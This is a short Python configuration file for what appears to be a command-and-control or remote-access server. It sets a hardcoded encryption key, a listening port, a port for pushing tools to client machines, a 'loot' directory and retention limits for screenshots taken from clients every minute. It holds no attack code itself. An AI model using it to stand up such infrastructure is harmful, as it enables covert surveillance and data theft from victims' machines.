# --- Encryption settings --- #
USE_ENCRYPTION = True
ENCRYPTION_KEY = "FfmExgn4kwEc8uxueSOaLsoKYCM1DpQ2GSe6xSdOIfA="  # openssl rand -base64 32

# --- Server settings --- #
LISTEN_ALL = "0.0.0.0"
LISTENING_PORT = 43558
HTTP_PORT = 26954  # To download tools on client machine
SOCKET_TIMEOUT = 5  # Connection timeout in seconds
BUFFER_SIZE = 65536  # Data reception buffer size
                     # 64KB is ideal balance for most systems

# --- Storage settings --- #
LOOT_DIR = "loot"
MAX_SCREENSHOTS_PER_CLIENT = 1000  # Every minute that is 1000 minutes, >16hrs
SCREENSHOT_RETENTION_DAYS = 7
MAX_SCREENSHOT_DIR_SIZE_MB = 512


# --- Logging settings --- #
LOG_LEVEL = "INFO"  # DEBUG, INFO, SUCCESS, WARNING, ERROR
SILENT_MODULES = []  # Modules to silence ("receiver", "filesystem" or "decryption)
LOG_COLORS = True  # Enable colored terminal output
